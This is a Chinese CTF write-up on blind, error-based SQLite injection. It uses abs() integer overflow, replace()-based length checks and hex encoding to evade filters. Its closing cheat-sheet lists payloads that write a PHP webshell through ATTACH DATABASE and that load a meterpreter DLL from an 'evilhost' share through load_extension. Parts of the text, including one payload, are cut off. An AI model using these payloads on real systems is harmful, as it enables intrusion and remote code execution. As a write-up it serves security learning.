从这基本可以确定是盲注了（从上面的 `banword` 也可以猜测），接下来我们需要的是故意使其报错，以便我们判断盲注是否正确。
**基于错误的 SQLite 盲注**
**可供制造错误的函数**
通过参考 [SQLite 官方手册的内置函数](https://www.sqlite.org/lang_corefunc.html)
我们找到了以下几个函数故意制造错误：
> `load_extension(x)`、`load_extension(x,y)`
>
> `load_extension(x,y)` 函数使用入口点 y 从名为 x 的共享库文件中加载 SQLite 扩展。`load_extension
> ()` 的结果总是 NULL 。如果省略 y，则使用默认的入口点名称。如果扩展未能正确加载或初始化，则 `load _ extension()` 函数
> **引发异常** 。
>
> 这个函数可以加载动态库，如 windows 的 dll ，linux 的 so ，换言之，我们可以利用其进行远程命令执行，这可以参考这篇
> [利用这个函数反弹
> shell](https://blog.csdn.net/qq_34101364/article/details/109250435) 的博客。
>
> `abs(x)`
>
> 返回数值参数 x 的绝对值，如果 x 为 NULL，则 abs(x) 返回 NULL。如果 x 是不能转换为数值的字符串或 blob，则 Abs (x)
> 返回0.0 。如果 x 是整数 -922337203685475808，那么 abs (x) **抛出一个整数溢出错误** 。
>
> 
>
> 0x8000000000000000 为 -922337203685475808 的十六进制形式。
>
> `sum(x)`
>
> 返回一组中所有非空值的数值总和。如果所有输入都是整数或者 NULL，在结果溢出时，`sum(x)` 将抛出一个 **“整数溢出”异常** 。
>
> `ntile(n)`
>
> 参数 n 被作为整数处理。这个函数将分区尽可能平均地划分为 n 组，并按 ORDER BY 子句定义的顺序或其他任意顺序将1到 n
> 之间的整数分配给每个组。如果有必要，会首先出现更大的组。此函数返回分配给当前行所属组的整数值。同上也是整数溢出。
这里明显只能用整数溢出。
最朴素的盲注，是用 substr 和 ord 配合使用进行判断，但这里明显对其进行了限制，而且最重要的是，我们既不能用字符（引号被过滤），也不能用
ascii 码判断（ char 被过滤），那么我们到底要怎么才能判断每一位是否正确呢？
####  利用长度变化的盲注
> 出题人 [st98 师傅](https://st98.github.io/diary/posts/2019-05-21-harekaze-> ctf-2019.html#web-350-sqlite-voting) 是利用 `replace` 来判断是否正确：
>
> [replace(x,y,z)](https://www.sqlite.org/lang_corefunc.html#replace)
>
> replace (x，y，z) 函数返回一个字符串，这个字符串是用字符串 z 替换字符串 x 中每个字符串 y 而形成的。BINARY
> 排序序列用于比较。如果 y 是一个空字符串，那么返回 x 不变。如果 z 最初不是字符串，则在处理之前将其强制转换为 UTF-8字符串。
>
> 简而言之，设 flag 为 `flag{landv01}` ，长度为 13 。
>
> 
>
> 长度变为了 9 ，是因 flag 中的 `flag` 四位被替换为空。
>
> 所以我们可以利用长度的变化来判断是否正确。
>
> * * *
>
> 下面是我对利用长度变化进行盲注的一些扩展：
>
> 实际上，我还找到了 `trim(x,y)` 企图达到与 `replace` 一样的效果：
>
> 
>
> 但当测试包含 `{` 时，`trim(x,y)` 的回显为什么却是 6 ？
>
> 
>
> 结合[官方文档](https://www.sqlite.org/lang_corefunc.html#trim)的解释，`trim(x,y)`
> 函数返回一个字符串，该字符串由删除 X **两端** 出现在 Y 中的 **任何和所有字符组成** 。
>
> 如果省略了 Y 参数，`trim(x)` 将删除 X 两端的空格（这是最常用的用法）
>
> 也就是说，如果 y 是 `flag{` ，那么 `fla` 、`la`
> 这样的组合都会被删掉，所以并不能用于判断是否正确，虽说你可以一直寻找直至长度变化（ `ltrim()` 这里是删除 x 左端）：
>
> 
>
> 虽说在 SQLite `trim()` 不能很有效地判断，但在
> [Oracle](https://docs.oracle.com/en/database/oracle/oracle-> database/20/sqlrf/TRIM.html#GUID-00D5C77C-19B1-4894-828F-066746235B03)
> 中是可行的：
>
> “如果您指定了 LEADING，那么 Oracle 数据库将删除所有等于 trim _ character 的前导字符。”
>  
>  
>     length(trim(leading 'f' from flag))
>  
>
> 上述语句可在 Oracle 中用于判断。
现在我们报错和判断正确的手段都有了，就要考虑特殊字符的绕过。
一堆限制，就用 hex 编码来进行绕过，因为一些比较的运算符都被 ban 了，我们利用位运算符代替：
以下脚本来自出题人师傅博客。
首先考虑 flag 长度的判断。
    abs(case(length(hex((select(flag)from(flag))))&{1
hex(‘some_char’) | 获得数据  
文件写入 | 1’;ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn
(dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘’;— | 需要堆叠查询对应配置开启  
代码执行 | UNION SELECT
1,load_extension(‘\evilhost\evilshare\meterpreter.dll’,’DllMain’);— |
具体使用可以看上面介绍给出的链接，默认情况下这个函数是禁用的。  
## 0x05 参考